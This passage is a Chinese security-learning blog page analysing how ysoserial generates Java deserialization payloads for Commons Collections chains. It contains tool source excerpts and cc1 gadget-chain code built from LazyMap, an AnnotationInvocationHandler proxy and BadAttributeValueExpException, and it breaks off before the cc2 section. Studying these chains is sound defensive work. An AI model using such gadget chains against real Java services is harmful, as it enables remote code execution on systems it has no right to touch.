@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"little-gu.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="结合两条cc链分析ysoserial实现小记：之前学习了两条cc链，后续打算跟着ysoserial工具学习，看下其实现payload原理顺便巩固一下java基础 yso payload生成分析入口函数如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253">
+<meta property="og:type" content="article">
+<meta property="og:title" content="结合两条cc链分析ysoserial实现">
+<meta property="og:url" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="结合两条cc链分析ysoserial实现小记：之前学习了两条cc链，后续打算跟着ysoserial工具学习，看下其实现payload原理顺便巩固一下java基础 yso payload生成分析入口函数如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/2.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/3.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/4.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/5.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/6.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/7.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/8.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/9.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/10.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/11.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/12.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/13.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/14.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/15.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/16.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/17.png">
+<meta property="article:published_time" content="2021-04-03T10:15:03.000Z">
+<meta property="article:modified_time" content="2021-04-03T12:16:15.857Z">
+<meta property="article:author" content="热爱篮球和安全的小伙子">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/1.png">
+
+
+<link rel="canonical" href="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>结合两条cc链分析ysoserial实现 | hungry and humble</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">hungry and humble</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">结合两条cc链分析ysoserial实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#yso-payload%E7%94%9F%E6%88%90%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">yso payload生成分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cc1-payload%E7%94%9F%E6%88%90"><span class="nav-number">1.2.</span> <span class="nav-text">cc1 payload生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cc2-payload%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">cc2 payload分析</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="热爱篮球和安全的小伙子"
+      src="/uploads/ckrie.jpg">
+  <p class="site-author-name" itemprop="name">热爱篮球和安全的小伙子</p>
+  <div class="site-description" itemprop="description">记录我的学习之旅</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/ckrie.jpg">
+      <meta itemprop="name" content="热爱篮球和安全的小伙子">
+      <meta itemprop="description" content="记录我的学习之旅">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hungry and humble">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          结合两条cc链分析ysoserial实现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-04-03 18:15:03 / Modified: 20:16:15" itemprop="dateCreated datePublished" datetime="2021-04-03T18:15:03+08:00">2021-04-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="结合两条cc链分析ysoserial实现"><a href="#结合两条cc链分析ysoserial实现" class="headerlink" title="结合两条cc链分析ysoserial实现"></a>结合两条cc链分析ysoserial实现</h1><p>小记：之前学习了两条cc链，后续打算跟着ysoserial工具学习，看下其实现payload原理顺便巩固一下java基础</p>
+<h2 id="yso-payload生成分析"><a href="#yso-payload生成分析" class="headerlink" title="yso payload生成分析"></a>yso payload生成分析</h2><p>入口函数如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratePayload</span> </span>&#123;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERNAL_ERROR_CODE = <span class="number">70</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> USAGE_CODE = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">           <span class="comment">//首先查看接受参数是否为2，不是就输出用法</span></span><br><span class="line">            <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">                     printUsage();</span><br><span class="line">                     System.exit(USAGE_CODE);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">final</span> String payloadType = args[<span class="number">0</span>];</span><br><span class="line">              <span class="keyword">final</span> String command = args[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">//判断payload是否存在。Utils为静态类，getPayloadClass获取类名</span></span><br><span class="line">            <span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass =  Utils.getPayloadClass(payloadType);</span><br><span class="line">              <span class="keyword">if</span> (payloadClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                     System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType +  <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                     printUsage();</span><br><span class="line">                     System.exit(USAGE_CODE);</span><br><span class="line">                     <span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">              &#125;</span><br><span class="line">        <span class="comment">//paloadClass的值为(Class&lt;? extends ObjectPayload&gt;)  Class.forName(className);</span></span><br><span class="line">        <span class="comment">//getObject为接口方法，payload会实现该方法并传入执行的命令生成一个类实例</span></span><br><span class="line">        <span class="comment">//最后释放</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                     <span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">                     <span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">                     PrintStream out = System.out;</span><br><span class="line">                     Serializer.serialize(object, out);</span><br><span class="line">                     ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">              &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                     System.err.println(<span class="string">&quot;Error while generating or serializing  payload&quot;</span>);</span><br><span class="line">                     e.printStackTrace();</span><br><span class="line">                     System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">              &#125;</span><br><span class="line">              System.exit(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">              System.err.println(<span class="string">&quot;Y SO SERIAL?&quot;</span>);</span><br><span class="line">              System.err.println(<span class="string">&quot;Usage: java -jar ysoserial-[version]-all.jar  [payload] &#x27;[command]&#x27;&quot;</span>);</span><br><span class="line">              System.err.println(<span class="string">&quot;  Available payload types:&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              <span class="keyword">final</span> List&lt;Class&lt;? extends ObjectPayload&gt;&gt; payloadClasses =</span><br><span class="line">                     <span class="keyword">new</span> ArrayList&lt;Class&lt;? extends  ObjectPayload&gt;&gt;(ObjectPayload.Utils.getPayloadClasses());</span><br><span class="line">              Collections.sort(payloadClasses, <span class="keyword">new</span> Strings.ToStringComparator());  <span class="comment">// alphabetize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String[]&gt; rows = <span class="keyword">new</span> LinkedList&lt;String[]&gt;();</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;Authors&quot;</span>, <span class="string">&quot;Dependencies&quot;</span>&#125;);</span><br><span class="line">        rows.add(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;-------&quot;</span>, <span class="string">&quot;-------&quot;</span>, <span class="string">&quot;------------&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;? extends ObjectPayload&gt; payloadClass : payloadClasses) &#123;</span><br><span class="line">             rows.add(<span class="keyword">new</span> String[] &#123;</span><br><span class="line">                payloadClass.getSimpleName(),</span><br><span class="line">                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)),  <span class="string">&quot;, &quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">                 Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),<span class="string">&quot;, &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> List&lt;String&gt; lines = Strings.formatTable(rows);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;     &quot;</span> + line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/1.png" alt="1"></p>
+<p>做一个判断，使用错误则输出用法。反之则根据exp生成payload序列化数据输出</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/2.png" alt="2"></p>
+<p>Utils.getPayloadClass获取类–&gt;经过if判断之后获取实例对象–&gt;将command传入实现ObjectPayload接口getObject方法中(也就是paylaod实现的该接口)–&gt;生成payload之后序列化其数据–&gt;释放对象内存</p>
+<p>生成序列化数据可添加如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span>  IOException </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">       objOut.writeObject(obj);</span><br><span class="line">       <span class="comment">//*****************这里添加一个生产payload文件的代码</span></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./payload.ser&quot;</span>);</span><br><span class="line">           ObjectOutputStream ot = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">           ot.writeObject(obj);</span><br><span class="line">           ot.close();</span><br><span class="line">           fout.close();</span><br><span class="line">       &#125;<span class="keyword">catch</span> (FileNotFoundException FNFE)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;./payload.ser Not Found&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//*****************</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229108">https://www.anquanke.com/post/id/229108</a> 安全客的这篇文章分析了该工具实现以及payload如何自行编写。</p>
+<h2 id="cc1-payload生成"><a href="#cc1-payload生成" class="headerlink" title="cc1 payload生成"></a>cc1 payload生成</h2><p>这里主要是了解该工具payload生成的原理以及动态代理的应用，之前分析过cc1,前面的跳过，直接看到lazyMap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);<span class="comment">//获取实例对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);<span class="comment">//传入map类型对象和一个接口类，实现动态代理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler =  Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm  with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure>
+<p>1.通过lazyMap.decorate方法获取实例对象</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/3.png" alt="3"></p>
+<p>因为传入的参数是transformer类型，所以会调用第二种方法。</p>
+<p>2.跟进Gadgets.createMemoitizedProxy</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/4.png" alt="4"></p>
+<p>进入Gadgets类，这里调用createMemoitizedProxy方法传入一个Map类型对象和多个接口类，然后返回createProxy方法来创建动态代理对象。</p>
+<p>看到createMemoizedInvocationHandler方法中会生成调用处理器，跟进Reflection类可以发现是实现反射的方法。获取ANN_INV_HANDLER_CLASS的实例。参数 ANN_INV_HANDLER_CLASS 值为 sun.reflect.annotation.AnnotationInvocationHandler. 该类是 Java 中专门用来处理注解的调用处理器 , 但 Java 中不允许直接获取该类 , 所以必须要通过反射( Reflection ) 才能拿到该类，之前分析的payload也是在该类拿到的readObject复写点。</p>
+<p>但是这里有一个问题newInstance() 方法第一个参数为 Override.class</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/5.png" alt="5"></p>
+<p>通过调试发现最终会传入AnnotationInvocationHandler类的构造参数var1中，要求是一个注解类，这就是需要传入的一个注解类的原因。</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/6.png" alt="6"><br>根据调试信息最后var2会传入lazyMap对象，而该类invoke方法最终会调用LazyMap.get() 方法，然后就能拼接利用链。</p>
+<p>继续看final InvocationHandler handler =  Gadgets.createMemoizedInvocationHandler(mapProxy)</p>
+<p>服务端会调用AnnotationInvocationHandler.readObject() 方法，AnnotationInvocationHandler.readObject() 中会调用 this.memberValues.entrySet()，this.memberValues方法值为传入的mapProxy动态代理对象，entrySet()又是Map接口即被代理的方法，调用该方法会转发到调用处理器的 invoke() 方法中。</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/7.png" alt="7"></p>
+<p>该方法中</p>
+<p>Object var6 = this.memberValues.get(var4);</p>
+<p>this.memberValues 参数会被赋值为 LazyMap 对象，最后调用LazyMap的get方法进入利用链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原本的payload</span></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = poc.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valfield.set(poc, entry);</span><br></pre></td></tr></table></figure>
